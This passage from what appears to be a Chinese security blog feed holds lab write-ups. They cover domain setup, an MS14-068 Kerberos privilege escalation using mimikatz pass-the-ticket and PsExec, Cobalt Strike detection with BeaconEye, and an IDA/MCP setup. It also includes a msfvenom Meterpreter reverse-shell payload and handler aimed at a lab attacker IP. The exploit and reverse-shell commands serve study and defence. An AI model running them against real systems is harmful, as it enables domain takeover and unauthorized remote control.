<li><p>右下角，打开“网络和共享中心”。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003191627383.png" alt="image-20251003191627383"></p>
</li>
<li><p>配置IPv4地址为“10.10.10.2”。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003191751608.png" alt="image-20251003191751608"></p>
</li>
<li><p>测试是否ping通域控服务器，打开cmd，<code>ping 10.10.10.1</code>。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003191911883.png" alt="image-20251003191911883"></p>
</li>
<li><p>打开计算机属性，高级系统设置，计算机名，更改。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003192037543.png" alt="image-20251003192037543"></p>
</li>
<li><p>输入域名。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003192150503.png" alt="image-20251003192150503"></p>
</li>
<li><p>确认之后弹出对话框，需要输入域管理员账号密码，输入之后点击确认，稍等一会，看见欢迎加入test.com域，就成功了，然后需要重启。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003192332897.png" alt="image-20251003192332897"></p>
</li>
<li><p>win7重启之后，登录需要重置密码，这里重置为<code>win7user1.</code></p>
</li>
<li><p>再返回到域控服务器，添加域用户alice，密码为<code>win7user1.</code>。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003193110805.png" alt="image-20251003193110805"></p>
</li>
<li><p>返回win7，使用创建的域用户登录，打开cmd，执行<code>net user /domain</code>命令，可以看到域账号。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003193408375.png" alt="image-20251003193408375"></p>
<p>后续为了区分不同账户，我又把admin账号的密码改为了<code>test@win7</code></p>
</li>
</ol>
]]></content>
      <categories>
        <category>域渗透</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>域渗透-MS14-068权限提升漏洞利用实验</title>
    <url>/2025/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/</url>
    <content><![CDATA[<h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><p>MS14-068是微软在2014年11月发布的一个紧急补丁，其对应的知识库编号是KB3011780。 该补丁修复了CVE-2014-6324漏洞，该漏洞允许攻击者通过利用Kerberos KDC漏洞，将普通域用户权限提升为域管理员权限。</p>
<h2 id="确认域控服务器是否安装补丁"><a href="#确认域控服务器是否安装补丁" class="headerlink" title="确认域控服务器是否安装补丁"></a>确认域控服务器是否安装补丁</h2><p>执行<code>systeminfo | findstr 3011780</code>，返回结果为空，则说明没安装补丁。</p>
<p><img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/image-20251003200158254.png" alt="image-20251003200158254"></p>
<h2 id="工具准备"><a href="#工具准备" class="headerlink" title="工具准备"></a>工具准备</h2><ol>
<li>exploit程序（<a href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068%EF%BC%89">https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068）</a></li>
<li>psexec（<a href="https://learn.microsoft.com/en-us/sysinternals/downloads/psexec%EF%BC%89">https://learn.microsoft.com/en-us/sysinternals/downloads/psexec）</a></li>
<li>mimikatz（<a href="https://github.com/gentilkiwi/mimikatz%EF%BC%89">https://github.com/gentilkiwi/mimikatz）</a></li>
</ol>
<h2 id="漏洞利用复现"><a href="#漏洞利用复现" class="headerlink" title="漏洞利用复现"></a>漏洞利用复现</h2><ol>
<li><p>当前环境信息。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">win2k8r2域控服务器IP：10.10.10.1</span><br><span class="line">加入域的win7主机IP：10.10.10.2</span><br><span class="line">普通域用户账号/密码：alice/win7user1.</span><br></pre></td></tr></table></figure></li>
<li><p>复制所有工具到win7。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/image-20251003201639494.png" alt="image-20251003201639494"></p>
</li>
<li><p>win7用普通域用户alice登录，测试访问域控的C盘共享，访问被拒绝。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/image-20251003201923944.png" alt="image-20251003201923944"></p>
</li>
<li><p>使用mimikatz，执行<code>kereros::list</code>列出票据，执行<code>kerberos::purge</code>，将内存中已有的kerberos票据清除，再执行<code>kereros::list</code>确认是否清除票据。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/image-20251003202235047.png" alt="image-20251003202235047"><img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/image-20251003202308878.png" alt="image-20251003202308878"></p>
</li>
<li><p>执行<code>whoami /all</code>查看本机用户SID。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/image-20251003202543769.png" alt="image-20251003202543769"></p>
</li>
<li><p>利用ms14-068.exe提权工具生成伪造的kerberos协议认证证书。<code>MS14-068.exe -u &lt;userName&gt;@&lt;domainName&gt; -s &lt;userSid&gt; -d &lt;domainControlerAddr&gt;</code></p>
</li>
<li><p>实际执行<code>MS14-068.exe -u alice@test.com -s S-1-5-21-2801992062-1918021354-1617932239-1108 -d 10.10.10.1 -p win7user1.</code>，执行完毕生成TGT。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/image-20251003203004853.png" alt="image-20251003203004853"></p>
</li>
<li><p>利用mimikatz.exe将证书写入，从而提升为域管理员。执行<code>kerberos::ptc 刚才生成的tgt路径</code><img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/image-20251003203245919.png" alt="image-20251003203245919"></p>
</li>
<li><p>再次列出域控制器的C盘目录，成功访问域控的C盘，说明普通域用户提权成域管理员用户成功。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/image-20251003203404168.png" alt="image-20251003203404168"></p>
</li>
<li><p>使用PSTools目录下的PsExec.exe获取shell，以域管理员权限运行连接域控。执行<code>PsExec.exe \\win2k8dc.test.com cmd.exe</code>。进入shell后，执行<code>ipconfig</code>确认是否是域控服务器IP<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/image-20251003203654003.png" alt="image-20251003203654003"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>域渗透</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>使用BeaconEye排查cobaltstrike木马</title>
    <url>/2025/10/04/%E4%BD%BF%E7%94%A8BeaconEye%E6%8E%92%E6%9F%A5cobaltstrike%E6%9C%A8%E9%A9%AC/</url>
    <content><![CDATA[<h2 id="什么是cobaltstrike"><a href="#什么是cobaltstrike" class="headerlink" title="什么是cobaltstrike"></a>什么是cobaltstrike</h2><p>Cobalt Strike（简称 CS）是一款基于 Java 开发的<strong>商业级红队&#x2F;渗透测试 C2（Command &amp; Control）框架</strong>，采用 C&#x2F;S 架构：  </p>
<ul>
<li><strong>服务端</strong>（team server）唯一，必须运行在 Linux 上，默认监听 50050 端口；  </li>
<li><strong>客户端</strong>可多个，Windows&#x2F;Linux&#x2F;macOS 均可运行，支持多人协同作战。</li>
</ul>
<h3 id="核心能力"><a href="#核心能力" class="headerlink" title="核心能力"></a>核心能力</h3><ol>
<li><strong>后渗透与横向移动</strong>：内置 Beacon 载荷，支持 HTTP&#x2F;HTTPS&#x2F;DNS&#x2F;SMB 等多种回连协议，具备“低速慢速”异步通信特征，可绕过多数流量检测。  </li>
<li><strong>武器化生成</strong>：一键生成 Windows EXE&#x2F;DLL、Java、Office 宏、HTA、PowerShell、Payload-in-PDF 等木马，并可与外部漏洞利用模块组合。  </li>
<li><strong>钓鱼与社工</strong>：集成网站克隆、邮件群发、证书窃取、浏览器中间人劫持、UAC&#x2F;凭据弹窗欺骗等模块，用于模拟 APT 钓鱼入口。  </li>
<li><strong>内网隧道与代理</strong>：自动端口转发、SOCKS4a&#x2F;HTTP 代理、多层跳板，方便在隔离网段中横向。  </li>
<li><strong>权限维持与提权</strong>：支持计划任务、服务、WMI、注册表、Logon Script、DCOM 等多种持久化方式；集成 40+ 本地提权 exploit（UAC、内核、AlwaysInstallElevated 等）。  </li>
<li><strong>域渗透套件</strong>：凭据导出（hash、明文、Kerberos 票据）、Pass-the-Hash&#x2F;Pass-the-Ticket、Golden&#x2F;Silver Ticket、DCSync、BloodHound 结果导入等。  </li>
<li><strong>流量伪装与对抗</strong>：Malleable C2 配置文件允许自定义 URI、Header、证书、编码&#x2F;加密流程，可把流量伪装成正常网站、云盘、甚至模仿 Zeus、CozyBear 等已知恶意软件特征。  </li>
<li><strong>日志与报告</strong>：自动记录所有操作、截图、键盘记录，可导出为 ATT&amp;CK 映射报告，方便红队复盘与蓝队演练总结。</li>
</ol>
<h3 id="典型使用场景"><a href="#典型使用场景" class="headerlink" title="典型使用场景"></a>典型使用场景</h3><ul>
<li>红队评估：模拟 APT 攻击链，从入口→立足→横向→域控→数据窃取完整演练。  </li>
<li>蓝队对抗：检验 EDR、NDR、SIEM 检测规则与应急响应流程。  </li>
<li>内网审计：在授权情况下，验证内网隔离、补丁管理、最小权限原则有效性。</li>
</ul>
<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>Cobalt Strike 为<strong>商业收费软件</strong>（单授权年费数千美元），但网络上存在大量破解版，因此被黑灰产与真实 APT 组织广泛滥用。官方版本已加入水印、License 校验与云端溯源机制，<strong>非法使用存在被追踪风险</strong>。在中国，任何未授权的网络攻击行为均触犯《刑法》第 285、286 条，<strong>仅限在封闭靶场或客户书面授权范围内使用</strong>。</p>
<h2 id="什么是BeaconEye"><a href="#什么是BeaconEye" class="headerlink" title="什么是BeaconEye"></a>什么是BeaconEye</h2><p>BeaconEye 是一款专门用于<strong>检测和监控 Cobalt Strike Beacon</strong> 的开源安全工具，由安全研究者 @<em>EthicalChaos</em> 开发，2021 年 8 月首次发布后即因检出率高、绕过难度大而在防御端快速走红。其核心思路是<strong>把“Beacon 配置（Beacon Config）”作为强特征</strong>，通过扫描进程内存或离线 Minidump 文件，定位并解析 Beacon 运行时解密后的配置数据，从而判断目标进程是否被注入 Beacon，同时可提取 C2 地址、命令输出等关键信息。</p>
<h3 id="1-工作原理"><a href="#1-工作原理" class="headerlink" title="1. 工作原理"></a>1. 工作原理</h3><ul>
<li>Beacon 在启动时会将一份完整的 TLV 格式配置表（含 C2、URI、心跳间隔、是否启用 sleep_mask 等参数）两次解密到堆内存；BeaconEye 利用 yara 规则匹配这块“解密后、使用前”的配置结构即可瞬间锁定 Beacon。</li>
<li>工具附带调试器功能，可在活进程上动态挂钩，实时解密 HTTP&#x2F;HTTPS Beacon 的 AES 会话密钥，把攻击者下发的命令与回显落地成日志，实现“上帝视角”取证。</li>
</ul>
<h3 id="2-主要功能"><a href="#2-主要功能" class="headerlink" title="2. 主要功能"></a>2. 主要功能</h3><ul>
<li>扫描运行进程或离线 dump：支持按进程名过滤，可批量审计终端或服务器内存镜像。</li>
<li>导出 Beacon 配置：自动解析 C2 地址、端口、心跳、User-Agent、PublicKey 等字段。</li>
<li>监控 C2 交互：实时记录命令输入与输出、屏幕截图，为后续溯源提供原始证据。</li>
<li>检测隐藏&#x2F;注入 Beacon：对使用了 sleep_mask、进程注入、自定义 loader 的样本同样有效。</li>
<li>多平台编译：原版基于 .NET ≥4.0，另有 Golang 重写的 EvilEye 供无 .NET 环境使用。</li>
</ul>
<h3 id="3-使用场景"><a href="#3-使用场景" class="headerlink" title="3. 使用场景"></a>3. 使用场景</h3><ul>
<li>企业威胁狩猎：定期巡检关键服务器与终端，发现潜伏 Beacon。</li>
<li>应急响应：在疑似被攻陷主机上快速确认是否存在 Cobalt Strike 控制通道。</li>
<li>取证分析：对已获得的内存镜像或 Minidump 文件离线扫描，提取攻击者 C2 信息。</li>
</ul>
<h3 id="4-局限与对抗"><a href="#4-局限与对抗" class="headerlink" title="4. 局限与对抗"></a>4. 局限与对抗</h3><ul>
<li>仅支持 HTTP&#x2F;HTTPS Beacon 的实时流量解密；对 DNS、SMB、TCP Pipe 模式只能做静态检出。</li>
<li>BeaconEye 的规则高度依赖“标准 TLV 配置”结构，通过自定义 loader、在堆上打乱顺序、手动修改配置长度或把配置挪到栈&#x2F;其他堆块，可实现 Bypass。</li>
<li>从 CS 4.5 起官方引入 sleep_mask（睡眠时加密堆内存）并持续更新混淆策略，需要防御者及时更新扫描器或配合 yara、ETW、ETI 等多维度规则。</li>
</ul>
<p>一句话总结：BeaconEye 就是“专门在内存里找 Cobalt Strike 信标”的猎手工具，凭借对 Beacon Config 的高置信特征匹配，让大量传统隐匿手段失效，是目前蓝队威胁狩猎与应急取证中必备的“探照灯”之一。</p>
<h2 id="BeaconEye使用"><a href="#BeaconEye使用" class="headerlink" title="BeaconEye使用"></a>BeaconEye使用</h2><ol>
<li>执行上线。<img src="/../images/%E4%BD%BF%E7%94%A8BeaconEye%E6%8E%92%E6%9F%A5cobaltstrike%E6%9C%A8%E9%A9%AC/image-20251004212757275.png" alt="image-20251004212757275"></li>
<li>下载。<a href="https://github.com/CCob/BeaconEye/releases/tag/0.3">https://github.com/CCob/BeaconEye/releases/tag/0.3</a></li>
<li>运行。<img src="/../images/%E4%BD%BF%E7%94%A8BeaconEye%E6%8E%92%E6%9F%A5cobaltstrike%E6%9C%A8%E9%A9%AC/image-20251004212933322.png" alt="image-20251004212933322"></li>
<li>很奇怪没扫到。</li>
</ol>
]]></content>
      <categories>
        <category>应急响应</category>
      </categories>
      <tags>
        <tag>应急响应</tag>
        <tag>蓝队</tag>
      </tags>
  </entry>
  <entry>
    <title>使用IDA PRO 7.0分析msf生成的exe木马</title>
    <url>/2025/10/04/%E4%BD%BF%E7%94%A8IDA-PRO-7-0%E5%88%86%E6%9E%90msf%E7%94%9F%E6%88%90%E7%9A%84exe%E6%9C%A8%E9%A9%AC/</url>
    <content><![CDATA[<h2 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h2><ol>
<li>kali linux攻击者IP：10.10.10.100</li>
<li>win7受害者IP：10.10.10.2</li>
<li>确保主机之间能ping通。<img src="/../images/%E4%BD%BF%E7%94%A8IDA-PRO-7-0%E5%88%86%E6%9E%90msf%E7%94%9F%E6%88%90%E7%9A%84exe%E6%9C%A8%E9%A9%AC/image-20251004162601751.png" alt="image-20251004162601751"></li>
<li>如果kali主机ping不通win7主机，请检查防火墙规则。<img src="/../images/%E4%BD%BF%E7%94%A8IDA-PRO-7-0%E5%88%86%E6%9E%90msf%E7%94%9F%E6%88%90%E7%9A%84exe%E6%9C%A8%E9%A9%AC/image-20251004162427496.png" alt="image-20251004162427496"></li>
</ol>
<h2 id="使用msfconsole监听木马"><a href="#使用msfconsole监听木马" class="headerlink" title="使用msfconsole监听木马"></a>使用msfconsole监听木马</h2><ol>
<li>执行<code>msfconsole</code>。进入框架。<img src="/../images/%E4%BD%BF%E7%94%A8IDA-PRO-7-0%E5%88%86%E6%9E%90msf%E7%94%9F%E6%88%90%E7%9A%84exe%E6%9C%A8%E9%A9%AC/image-20251004163014757.png" alt="image-20251004163014757"></li>
<li>执行如下命令。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp   # 必须与 msfvenom 生成木马一致</span><br><span class="line">set LHOST 10.10.10.100                        # 攻击机 IP</span><br><span class="line">set LPORT 4444                                # 攻击机端口</span><br><span class="line">set ExitOnSession true                        # 保持监听，可接多个会话</span><br><span class="line">exploit -j -z                                 # 启用监听 -j 后台任务形式，-z 会话成功后自动放到后台</span><br></pre></td></tr></table></figure></li>
</ol>
<p><img src="/../images/%E4%BD%BF%E7%94%A8IDA-PRO-7-0%E5%88%86%E6%9E%90msf%E7%94%9F%E6%88%90%E7%9A%84exe%E6%9C%A8%E9%A9%AC/image-20251004163633188.png" alt="image-20251004163633188"></p>
<h2 id="使用msfvenom生成木马"><a href="#使用msfvenom生成木马" class="headerlink" title="使用msfvenom生成木马"></a>使用msfvenom生成木马</h2><ol>
<li>命令格式。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp \</span><br><span class="line">         LHOST=&lt;你的Kali IP&gt; \</span><br><span class="line">         LPORT=&lt;监听端口&gt; \</span><br><span class="line">         -f exe -o &lt;文件名&gt;.exe</span><br></pre></td></tr></table></figure></li>
<li>测试生成。<code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.100 LPORT=4444 -f exe -o payload.exe</code><img src="/../images/%E4%BD%BF%E7%94%A8IDA-PRO-7-0%E5%88%86%E6%9E%90msf%E7%94%9F%E6%88%90%E7%9A%84exe%E6%9C%A8%E9%A9%AC/image-20251004163915055.png" alt="image-20251004163915055"></li>
</ol>
<h2 id="上线测试"><a href="#上线测试" class="headerlink" title="上线测试"></a>上线测试</h2><ol>
<li>将payload.exe拷贝到win7主机。</li>
<li>双击执行。</li>
<li>查看kali主机。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sessions -l            # 列出所有会话</span><br><span class="line">sessions -i 1          # 进入编号为 1 的 Meterpreter</span><br></pre></td></tr></table></figure></li>
</ol>
<p><img src="/../images/%E4%BD%BF%E7%94%A8IDA-PRO-7-0%E5%88%86%E6%9E%90msf%E7%94%9F%E6%88%90%E7%9A%84exe%E6%9C%A8%E9%A9%AC/image-20251004164256100.png" alt="image-20251004164256100"></p>
<h2 id="逆向分析exe"><a href="#逆向分析exe" class="headerlink" title="逆向分析exe"></a>逆向分析exe</h2><ol>
<li>打开ida.exe，打开payload.exe。<img src="/../images/%E4%BD%BF%E7%94%A8IDA-PRO-7-0%E5%88%86%E6%9E%90msf%E7%94%9F%E6%88%90%E7%9A%84exe%E6%9C%A8%E9%A9%AC/image-20251004164516071.png" alt="image-20251004164516071"></li>
</ol>
]]></content>
      <categories>
        <category>逆向分析</category>
      </categories>
      <tags>
        <tag>蓝队</tag>
        <tag>溯源反制</tag>
      </tags>
  </entry>
  <entry>
    <title>使用MCP自动化调用IDA进行逆向分析</title>
    <url>/2025/10/06/%E4%BD%BF%E7%94%A8MCP%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E7%94%A8IDA%E8%BF%9B%E8%A1%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><ol>
<li>Cherry-Studio</li>
<li>IDA 9.0</li>
<li>python-3.11.1</li>
</ol>
<h2 id="安装ida-pro-mcp"><a href="#安装ida-pro-mcp" class="headerlink" title="安装ida-pro-mcp"></a>安装ida-pro-mcp</h2><ol>
<li>执行<code>pip install ida-pro-mcp</code></li>
<li>执行<code>ida-pro-mcp --install</code></li>
<li>重启ida，看到mcp插件，则说明安装成功。<img src="/../images/%E4%BD%BF%E7%94%A8MCP%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E7%94%A8IDA%E8%BF%9B%E8%A1%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20251007173311270.png" alt="image-20251007173311270"></li>
<li>第3步骤遇到问题，报错如下。<img src="/../images/%E4%BD%BF%E7%94%A8MCP%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E7%94%A8IDA%E8%BF%9B%E8%A1%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/ida-pro-mcp%E5%AE%89%E8%A3%85%E5%A4%B1%E8%B4%A5.png" alt="ida-pro-mcp安装失败"></li>
<li>原来是缺少git，安装git之后，重新执行<code>ida-pro-mcp --install</code>，看到如下输出应该就是安装成功了。<img src="/../images/%E4%BD%BF%E7%94%A8MCP%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E7%94%A8IDA%E8%BF%9B%E8%A1%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20251007173634004.png" alt="image-20251007173634004"></li>
</ol>
<h2 id="配置Cherry"><a href="#配置Cherry" class="headerlink" title="配置Cherry"></a>配置Cherry</h2><ol>
<li>打开Cherry的设置。<img src="/../images/%E4%BD%BF%E7%94%A8MCP%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E7%94%A8IDA%E8%BF%9B%E8%A1%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20251007174046913.png" alt="image-20251007174046913"></li>
<li>复制配置文件</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;mcpServers&quot;: &#123;</span><br><span class="line">    &quot;github.com/mrexodia/ida-pro-mcp&quot;: &#123;</span><br><span class="line">      &quot;isActive&quot;: true,</span><br><span class="line">      &quot;command&quot;: &quot;C:\\Users\\h4ckf\\AppData\\Local\\Programs\\Python\\Python311\\python.exe&quot;,</span><br><span class="line">      &quot;args&quot;: [</span><br><span class="line">        &quot;C:\\Users\\h4ckf\\AppData\\Local\\Programs\\Python\\Python311\\Lib\\site-packages\\ida_pro_mcp\\server.py&quot;</span><br><span class="line">      ],</span><br><span class="line">      &quot;timeout&quot;: 1800,</span><br><span class="line">      &quot;disabled&quot;: false,</span><br><span class="line">      &quot;autoApprove&quot;: [</span><br><span class="line">        &quot;check_connection&quot;,</span><br><span class="line">        &quot;get_metadata&quot;,</span><br><span class="line">        &quot;get_function_by_name&quot;,</span><br><span class="line">        &quot;get_function_by_address&quot;,</span><br><span class="line">        &quot;get_current_address&quot;,</span><br><span class="line">        &quot;get_current_function&quot;,</span><br><span class="line">        &quot;convert_number&quot;,</span><br><span class="line">        &quot;list_functions&quot;,</span><br><span class="line">        &quot;list_strings&quot;,</span><br><span class="line">        &quot;search_strings&quot;,</span><br><span class="line">        &quot;decompile_function&quot;,</span><br><span class="line">        &quot;disassemble_function&quot;,</span><br><span class="line">        &quot;get_xrefs_to&quot;,</span><br><span class="line">        &quot;get_entry_points&quot;,</span><br><span class="line">        &quot;set_comment&quot;,</span><br><span class="line">        &quot;rename_local_variable&quot;,</span><br><span class="line">        &quot;rename_global_variable&quot;,</span><br><span class="line">        &quot;set_global_variable_type&quot;,</span><br><span class="line">        &quot;rename_function&quot;,</span><br><span class="line">        &quot;set_function_prototype&quot;,</span><br><span class="line">        &quot;declare_c_type&quot;,</span><br><span class="line">        &quot;set_local_variable_type&quot;</span><br><span class="line">      ],</span><br><span class="line">      &quot;alwaysAllow&quot;: [</span><br><span class="line">        &quot;check_connection&quot;,</span><br><span class="line">        &quot;get_metadata&quot;,</span><br><span class="line">        &quot;get_function_by_name&quot;,</span><br><span class="line">        &quot;get_function_by_address&quot;,</span><br><span class="line">        &quot;get_current_address&quot;,</span><br><span class="line">        &quot;get_current_function&quot;,</span><br><span class="line">        &quot;convert_number&quot;,</span><br><span class="line">        &quot;list_functions&quot;,</span><br><span class="line">        &quot;list_strings&quot;,</span><br><span class="line">        &quot;search_strings&quot;,</span><br><span class="line">        &quot;decompile_function&quot;,</span><br><span class="line">        &quot;disassemble_function&quot;,</span><br><span class="line">        &quot;get_xrefs_to&quot;,</span><br><span class="line">        &quot;get_entry_points&quot;,</span><br><span class="line">        &quot;set_comment&quot;,</span><br><span class="line">        &quot;rename_local_variable&quot;,</span><br><span class="line">        &quot;rename_global_variable&quot;,</span><br><span class="line">        &quot;set_global_variable_type&quot;,</span><br><span class="line">        &quot;rename_function&quot;,</span><br><span class="line">        &quot;set_function_prototype&quot;,</span><br><span class="line">        &quot;declare_c_type&quot;,</span><br><span class="line">        &quot;set_local_variable_type&quot;</span><br><span class="line">      ],</span><br><span class="line">      &quot;name&quot;: &quot;ida-pro-mcp&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>点击编辑，粘贴配置文件进去，注意<code>command</code>和<code>args</code>键的值要替换成你的环境的值。配置完成后能看到个绿色的电脑✔<img src="/../images/%E4%BD%BF%E7%94%A8MCP%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E7%94%A8IDA%E8%BF%9B%E8%A1%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20251007174329329.png" alt="image-20251007174329329"></li>
<li>启动Cherry，点击默认助手，选择MCP服务器，点击启用。<img src="/../images/%E4%BD%BF%E7%94%A8MCP%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E7%94%A8IDA%E8%BF%9B%E8%A1%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20251007175404509.png" alt="image-20251007175404509"></li>
</ol>
<h2 id="测试CTF题目"><a href="#测试CTF题目" class="headerlink" title="测试CTF题目"></a>测试CTF题目</h2><ol>
<li><p>使用攻防世界的题目做测试（<a href="https://adworld.xctf.org.cn/challenges/list%EF%BC%89">https://adworld.xctf.org.cn/challenges/list）</a></p>
</li>
<li><p>这里下载题目easyRE1做测试。</p>
</li>
<li><p>把题目文件拖进ida，选择MCP插件，左下角输出监听端口，如果提示端口被占用，请杀掉占用的程序再继续。<img src="/../images/%E4%BD%BF%E7%94%A8MCP%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E7%94%A8IDA%E8%BF%9B%E8%A1%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20251007175643749.png" alt="image-20251007175643749"></p>
</li>
<li><p>开始分析，发现需要API密钥。<img src="/../images/%E4%BD%BF%E7%94%A8MCP%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E7%94%A8IDA%E8%BF%9B%E8%A1%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20251007180001212.png" alt="image-20251007180001212"></p>
</li>
<li><p>根据提示获取密钥，填写密钥之后还是报同样的错误。</p>
</li>
<li><p>返回检查mcp服务器配置。发现报错。<img src="/../images/%E4%BD%BF%E7%94%A8MCP%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E7%94%A8IDA%E8%BF%9B%E8%A1%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20251007191412340.png" alt="image-20251007191412340"></p>
</li>
